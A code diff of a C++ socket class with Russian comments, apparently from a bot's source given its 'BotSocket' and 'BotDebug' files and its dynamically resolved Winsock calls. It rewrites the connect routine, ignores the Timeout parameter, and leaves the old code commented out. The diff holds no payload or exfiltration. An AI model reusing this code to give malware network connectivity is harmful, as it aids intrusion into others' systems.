@@ -2,9 +2,10 @@
 
 #pragma hdrstop
 
-
+#include <winsock2.h>
 #include "Memory.h"
 #include "BotSocket.h"
+
 
 #include "BotDebug.h"
 namespace SOCKETDBGTEMPLATES
@@ -87,7 +88,9 @@ void TWinSocket::Close()
 	// Если сокет не был создан - ничего не делаем.
 	if (Socket == INVALID_SOCKET) return;
 
+	pshutdown(Socket, SD_BOTH);
 	pclosesocket(Socket);
+
 	Socket = INVALID_SOCKET;
 }
 
@@ -100,7 +103,36 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 	// Если сокет соединён - запрещаем повторное соединение
 	if (Socket != INVALID_SOCKET) return false;
 
-	do
+	// Инициализируем библиотеку
+	if (!InitWindowsSocketApi()) return false;
+
+	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname(HostName);
+
+	if (!lpHost)
+		return false;
+
+	// Открываем хост
+	Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );
+
+	if(Socket == SOCKET_ERROR)
+		return false;
+
+	struct sockaddr_in SockAddr;
+
+	SockAddr.sin_family		 = AF_INET;
+	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
+	SockAddr.sin_port		 = MAKEPORT((unsigned short)Port );
+
+	// подключаемся к сокету
+	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
+	{
+		pclosesocket( Socket );
+		Socket = INVALID_SOCKET;
+	}
+
+	return Socket != INVALID_SOCKET;
+
+/*	do
 	{
 		// Инициализируем библиотеку
 		if (!InitWindowsSocketApi()) break;
@@ -180,7 +212,7 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 	while (0);
 
 	Close();
-	return false;
+	return false; */
 }
 
 int TWinSocket::Write(const void* Buf, DWORD BufSize)
